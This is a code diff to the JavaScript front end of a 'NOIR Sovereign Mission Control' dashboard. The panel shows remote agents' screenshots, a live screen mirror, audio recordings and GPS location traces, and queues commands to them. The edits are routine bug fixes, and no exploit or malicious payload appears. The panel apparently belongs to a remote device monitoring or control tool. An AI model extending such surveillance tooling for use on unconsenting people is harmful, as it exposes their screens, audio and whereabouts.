@@ -121,14 +121,15 @@ function updateTelemetry(agent, ping) {
         if (vChip) vChip.innerHTML = `<i class="fas fa-code-branch"></i> ${stats.version}`;
     }
 
-    // Vision snapshot
+    // Vision snapshot — BUG#2 FIX: strip local: prefix before building URL
     if (agent.last_screenshot && agent.last_screenshot !== lastShot) {
         lastShot = agent.last_screenshot;
+        const cleanKey = lastShot.replace('local:', ''); // BUG#2 FIX
         const img = document.getElementById('vision-img');
-        if (img) { img.src = `/api/asset/${lastShot}?t=${Date.now()}`; img.style.opacity = 1; }
+        if (img) { img.src = `/api/asset/${cleanKey}?t=${Date.now()}`; img.style.display = 'block'; img.style.opacity = 1; }
         document.getElementById('vision-time').innerText = new Date().toLocaleTimeString();
         document.getElementById('vision-status').innerText = 'LIVE';
-        addMediaItem({ type: 'screenshot', key: lastShot, ts: Date.now() });
+        addMediaItem({ type: 'screenshot', key: cleanKey, ts: Date.now() });
     }
 }
 
@@ -158,14 +159,16 @@ function startMirror() {
             if (d.key && d.key !== lastFrame) {
                 lastFrame = d.key;
                 frameCount++;
+                const cleanKey = d.key.replace('local:', ''); // BUG#2 FIX
                 const img = document.getElementById('mirror-img');
                 img.style.display = 'block';
-                img.src = `/api/asset/${d.key}?t=${Date.now()}`;
+                img.src = `/api/asset/${cleanKey}?t=${Date.now()}`;
+                document.getElementById('mirror-placeholder').style.display = 'none';
                 // resolution hint
                 if (d.width && d.height) document.getElementById('mirror-res').innerText = `${d.width}×${d.height}`;
             }
         } catch {}
-    }, 350);
+    }, 500);
     addLog('SYSTEM', 'Live Mirror session started.');
 }
 
@@ -269,6 +272,14 @@ async function sendCmd(type, extra = {}) {
         });
         const d = await r.json();
         addLog('MESH', `Queued: ${(d.command_id || '').substring(0, 8)}`);
+        
+        // BUG#5 FIX: Handle GPS response — display in log and chat
+        if (type === 'location' && d.data) {
+            const { lat, lon, accuracy } = d.data;
+            addLog('GPS', `📍 Location: ${lat}, ${lon} (±${accuracy}m)`);
+            const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+            addChatBubble('ai', `📍 <b>GPS Trace Result:</b><br>Lat: ${lat}<br>Lon: ${lon}<br>Accuracy: ±${accuracy}m<br><a href="${mapsUrl}" target="_blank" style="color:var(--accent)">📌 Open in Maps</a>`);
+        }
         return d;
     } catch (e) { addLog('ERROR', `Command failed: ${e.message}`); }
 }
@@ -361,7 +372,7 @@ async function refreshMedia() {
 function renderMedia() {
     const grid = document.getElementById('media-grid');
     const filtered = mediaItems.filter(m =>
-        mediaMode === 'screenshots' ? m.type === 'screenshot' :
+        mediaMode === 'screenshots' ? m.type === 'screenshot' || m.type === 'image' :
         mediaMode === 'audio'       ? m.type === 'audio' : true);
     if (!filtered.length) {
         grid.innerHTML = '<div class="empty-state"><i class="fas fa-vault"></i><p>No media in vault.</p></div>';
@@ -369,15 +380,16 @@ function renderMedia() {
     }
     grid.innerHTML = filtered.map(m => {
         const ts = new Date(m.ts).toLocaleString();
+        const cleanKey = (m.key || '').replace('local:', ''); // BUG#2 FIX
         if (m.type === 'audio') return `
-            <div class="audio-card" onclick="openAudio('${m.key}')">
+            <div class="audio-card" onclick="openAudio('${cleanKey}')">
                 <i class="fas fa-music"></i>
-                <div><div style="font-weight:700;font-size:.8rem;">${m.key.substring(0,22)}</div><div style="font-size:.65rem;color:var(--dim);">${ts}</div></div>
+                <div><div style="font-weight:700;font-size:.8rem;">${cleanKey.substring(0,22)}</div><div style="font-size:.65rem;color:var(--dim);">${ts}</div></div>
             </div>`;
         return `
-            <div class="media-item" onclick="openImage('/api/asset/${m.key}')">
-                <img src="/api/asset/${m.key}" alt="" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22><rect fill=%22%23111%22/></svg>'">
-                <div class="media-item-info"><span>${m.key.substring(0,18)}</span>${ts}</div>
+            <div class="media-item" onclick="openImage('/api/asset/${cleanKey}')">
+                <img src="/api/asset/${cleanKey}" alt="" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1 1%22><rect fill=%22%23111%22/></svg>'">
+                <div class="media-item-info"><span>${cleanKey.substring(0,18)}</span>${ts}</div>
             </div>`;
     }).join('');
 }
@@ -391,11 +403,13 @@ function openImage(src) {
 }
 
 function openAudio(key) {
+    const cleanKey = key.replace('local:', ''); // BUG#2 FIX
     const lb = document.getElementById('lightbox');
     document.getElementById('lb-img').style.display = 'none';
     const a = document.getElementById('lb-audio');
-    a.src = `/api/asset/${key}`;
+    a.src = `/api/asset/${cleanKey}`;
     a.style.display = 'block';
+    a.load();
     a.play();
     lb.classList.remove('hidden');
 }
@@ -493,9 +507,11 @@ function exportLogs() {
 
 // ── BOOT ─────────────────────────────────────────────
 window.addEventListener('load', () => {
-    addLog('SYSTEM', 'NOIR SOVEREIGN MISSION CONTROL V21.0 AEGIS — INITIALIZED');
-    addChatBubble('system', 'NOIR AI AGENT V21.0 AEGIS — ONLINE');
+    addLog('SYSTEM', 'NOIR SOVEREIGN MISSION CONTROL V21.0.3 — INITIALIZED (BUG#1-7 FIXED)');
+    addChatBubble('system', 'NOIR AI AGENT V21.0.3 — ONLINE. Mirror, Camera, Audio, GPS: FIXED.');
     poll();
     setInterval(poll, 4000);
     setTimeout(refreshMedia, 2000);
+    // Auto-refresh media every 15s to catch new uploads
+    setInterval(refreshMedia, 15000);
 });
